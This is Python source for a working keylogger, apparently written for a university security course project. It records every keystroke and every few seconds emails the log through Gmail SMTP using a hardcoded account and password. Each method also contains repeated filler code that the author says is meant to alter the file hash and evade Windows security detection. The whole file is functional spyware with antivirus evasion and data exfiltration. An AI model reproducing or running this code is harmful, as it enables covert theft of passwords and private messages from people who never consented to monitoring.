#z5207667 Vincent Do
#COMP6441 Something Awesome Project
#Much of this code was taken from https://www.thepythoncode.com/article/write-a-keylogger-python
#and https://www.youtube.com/watch?v=0mo2bh-KYcA
#and tweaked to fit what I wanted, along with my own random variables to skirt
#windows 10 security

import keyboard
import smtplib
from threading import Timer
import random

email = "temp5207667@gmail.com"
password = "z5207667"

#SKL = simple key logger


class SKL:
    #
    def __init__(self, interval):
        # some random code to change the hash and hopefully get around windows security
        hashtemp = 290
        if hashtemp > 290:
            hashtemp *= 11.123
        rand = random.randint(0, 100)
        if (rand < 50):
            hashtemp += rand
        temp = "temp"
        temp += temp

        self.logger = ""
        self.interval = interval


    #called whenever a key is pressed, or released to be more accurate
    def callback(self, event):
        hashtemp = 290
        if hashtemp > 290:
            hashtemp *= 11.123
        rand = random.randint(0, 100)
        if (rand < 50):
            hashtemp += rand
        temp = "temp"
        temp += temp
        name = event.name

        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            if name == "space":
                name = "[SPC]"
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.logger += name

    #sends mail from our gmail to itself with the recorded keystrokes
    def send_mail(self, message):
        hashtemp = 290
        if hashtemp > 290:
            hashtemp *= 11.123
        rand = random.randint(0, 100)
        if (rand < 50):
            hashtemp += rand
        temp = "temp"
        temp += temp

        try:
            smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            smtp_server.ehlo()
            smtp_server.login(email, password)
            smtp_server.sendmail(email, email, message)
            smtp_server.close()
        except:
            #just try again
            self.send_mail(self, message)

    #sends the logger every 60 seconds and clears the logger for next mail
    def report_mail(self):
        hashtemp = 290
        if hashtemp > 290:
            hashtemp *= 11.123
        rand = random.randint(0, 100)
        if (rand < 50):
            hashtemp += rand
        temp = "temp"
        temp += temp

        if self.logger:
            self.send_mail(self.logger)
        self.logger = ""

        timer = Timer(self.interval, self.report_mail)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        hashtemp = 290
        if hashtemp > 290:
            hashtemp *= 11.123
        rand = random.randint(0, 100)
        if (rand < 50):
            hashtemp += rand
        temp = "temp"
        temp += temp
        
        keyboard.on_release(self.callback)
        self.report_mail()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = SKL(10)
    keylogger.start()